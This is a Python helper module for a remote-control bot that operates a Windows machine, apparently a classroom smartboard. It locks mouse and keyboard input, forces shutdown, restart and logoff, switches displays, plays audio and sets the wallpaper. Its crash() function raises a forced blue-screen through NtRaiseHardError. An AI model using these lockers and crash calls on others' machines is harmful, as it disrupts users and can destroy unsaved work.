import os
import sys
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

import pyautogui
from BotBase import mediaHandler#, data, Medium
import ctypes
import os
import subprocess
import qrcode
import io
import PIL
import pygame
import pygetwindow as gw
import pynput
import cv2
import random

#import ChromeReader
import tempfile
import shutil
import uuid
#import os

import time

# Minimal locker base & mouse/keyboard lockers (used by GTLite)
class Locker:
    locked: bool = False

    @classmethod
    def lock(cls):
        if cls.locked:
            return False
        cls._lock()
        cls.locked = True
        return True

    @classmethod
    def unlock(cls):
        if not cls.locked:
            return False
        cls._unlock()
        cls.locked = False
        return True

    @classmethod
    def _lock(cls):
        pass

    @classmethod
    def _unlock(cls):
        pass

class MouseLocker(Locker):
    listener: pynput.mouse.Listener = None

    @classmethod
    def _lock(cls):
        cls.listener = pynput.mouse.Listener(suppress=True)
        cls.listener.start()

    @classmethod
    def _unlock(cls):
        if cls.listener:
            cls.listener.stop()
            cls.listener = None

class KeyboardLocker(Locker):
    listener: pynput.keyboard.Listener = None

    @classmethod
    def _lock(cls):
        cls.listener = pynput.keyboard.Listener(suppress=True)
        cls.listener.start()

    @classmethod
    def _unlock(cls):
        if cls.listener:
            cls.listener.stop()
            cls.listener = None

# Window helpers (used by GTLite)

def hotkey(*wargs):
    keyboard_locked = KeyboardLocker.locked

    if keyboard_locked:
        KeyboardLocker.unlock()
    pyautogui.hotkey(*wargs)
    if keyboard_locked:
        KeyboardLocker.lock()

def hide_windows():
    hotkey("win", "d")

def show_windows():
    hotkey("win", "d")

def close_window():
    hotkey("alt", "f4")

def close_tab():
    hotkey("ctrl", "w")

# Shutdown / restart / logoff / hibernate / crash (used by GTLite)
def shutdown():
    try:
        os.system("shutdown /s /f /t 0")
        return True
    except:
        return False

def restart():
    try:
        os.system("shutdown /r /f /t 0")
        return True
    except:
        return False

def logoff():
    try:
        os.system("shutdown /l")
        return True
    except:
        return False

def hibernate():
    try:
        os.system("shutdown /h")
        return True
    except:
        return False

def crash():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, None, None, 6, ctypes.byref(ctypes.c_uint()))
        return True
    except:
        return False

# Projector / display helpers
def disconnect_lim():
    try:
        subprocess.run(["DisplaySwitch.exe", "/internal"])
        return True
    except:
        return None

def connect_lim():
    try:
        subprocess.run(["DisplaySwitch.exe", "/clone"])
        return True
    except:
        return None

# Media classes
class Photo(mediaHandler.File):
    def set_as_wallpaper(self):
        absolute_path = os.path.abspath(self.path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, absolute_path, 0)

pygame.mixer.init()

class AudioManager:
    sounds: dict[str, pygame.mixer.Sound] = {}

    @classmethod
    def get(cls, path):
        if path in cls.sounds:
            return cls.sounds[path]
        sound = pygame.mixer.Sound(path)
        cls.sounds[path] = sound
        return sound

    @classmethod
    def stop_all(cls):
        for sound in cls.sounds.values():
            sound.stop()

class Audio(mediaHandler.File):
    def __init__(self, medium: mediaHandler.Medium):
        super().__init__(medium)
        self.sound = AudioManager.get(self.path)

    def play(self):
        self.sound.play()

    def stop(self):
        self.sound.stop()

class Video(mediaHandler.File):
    def close(self):
        if windows := gw.getWindowsWithTitle("Lettore multimediale"):
            for window in windows:
                window.close()
        else:
            close_window()
